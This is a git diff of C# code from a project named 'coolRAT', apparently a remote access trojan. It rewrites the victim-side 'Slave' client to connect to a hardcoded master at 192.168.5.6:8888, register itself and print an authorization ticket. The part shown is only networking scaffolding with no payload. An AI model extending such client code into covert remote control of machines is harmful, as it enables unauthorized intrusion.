@@ -1,8 +1,10 @@
 ﻿using coolRAT.Libs;
+using coolRAT.Libs.Connections;
 using coolRAT.Libs.Packets;
 using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
@@ -14,28 +16,20 @@ namespace coolRAT.Slave
     {
         static void Main(string[] args)
         {
-            MasterFinder.RunInit(new ConnectionSettings(8888));
-            Console.WriteLine("-- Master Finder running");
-            while (true)
+            CAP_Client client = new CAP_Client(new IPEndPoint(IPAddress.Parse("192.168.5.6"), 8888));
+            Console.WriteLine("Client Authorization Protocol client initialized");
+            Console.WriteLine("Registering client...");
+            Guid clientId = client.RegisterClient();
+            if(clientId == Guid.Empty)
             {
-                MasterServerInfo inf = MasterFinder.ConnectToMasterServer();
-                if (inf.HasValues)
-                {
-                    SlaveGlobalData.MasterServerInfo = inf;
-                    SlaveGlobalData.LocalClient = inf.LocalClient;
-                    SlaveGlobalData.MainListenerLoop = new PacketListenerLoop(inf.MainConnection, new Slave_PacketHandler(inf.MainConnection));
-                    Console.WriteLine("Authentication complete.");
-                    Console.WriteLine($"Assigned Id: {inf.LocalClient.UniqueId}");
-                    Task.Run(() => SlaveGlobalData.MainListenerLoop.Run());
-                    Console.WriteLine($"PacketHandler of type {SlaveGlobalData.MainListenerLoop.Handler.GetType().ToString()} has been assigned to the main connection");
-                    break;
-                }
+                Console.WriteLine("Failed to register the client.");
+                Console.ReadLine();
+                return;
             }
-            
 
-
-            Console.WriteLine("Connected to the master server!");
+            Console.WriteLine($"Registered the client successfully. Authorization ticket: {clientId}");
             Console.ReadLine();
+            return;
         }
     }
 }
